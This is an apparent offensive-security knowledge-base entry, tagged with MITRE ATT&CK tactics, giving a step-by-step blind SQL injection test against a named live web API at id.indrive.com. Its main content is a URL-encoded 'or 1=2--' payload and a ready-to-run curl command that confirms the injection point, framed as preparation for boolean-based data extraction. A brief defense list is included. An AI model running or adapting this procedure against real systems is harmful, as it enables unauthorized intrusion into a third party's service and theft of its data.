---
tags:
  - blind-sqli
  - injection
  - web
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-blind-sqli-false-condition]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: f4b758fc-4de1-4f43-9e22-1a13712254d0
created_at: '2025-12-14T03:15:10.051Z'
updated_at: '2025-12-14T03:15:10.051Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-False-SQL-Condition-via-Curl

## Summary

This procedure injects a false SQL condition into the API URL path to elicit an empty response, validating the injection point by contrast.

## Description

Similar to the true condition test, 'or 1=2--' makes the WHERE clause false, resulting in no data returned. This confirms the vulnerability in the unsanitized path parameter within the PostgreSQL-backed web API.

## Requirements

1. Access to curl tool
2. Network connectivity to id.indrive.com
3. Baseline from true condition test

## Defense

Defensive measures and detection strategies:

- Use input validation to reject SQL keywords in paths
- Implement rate limiting on API endpoints
- Alert on empty responses following non-empty ones

## Objectives

1. Differentiate false condition response
2. Confirm injection control
3. Prepare for boolean-based extraction

## Instructions

### Step 1: Prepare the Payload

**Context**: URL-encode the false SQL payload.

**Instructions**: Use '999%20or%201=2--' to inject a always-false condition.

> This results in SELECT * FROM table WHERE id=1 OR 1=2 --, returning empty.

### Step 2: Execute Injection

**Context**: Send the request with browser-like headers.

**Command** ([[commands/curl-blind-sqli-false-condition]]):
```bash
curl -i -s -k -X GET -H 'Host: id.indrive.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Origin: https://promo.indrive.com' -H 'Referer: https://promo.indrive.com/' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-site' -H 'Te: trailers' -H 'Connection: close' 'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--'
```

> Expect an empty JSON response or error.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-blind-sqli-false-condition]]

## Tools Used

- [[tools/curl]]

## Tags

- [[blind-sqli]]
- [[injection]]
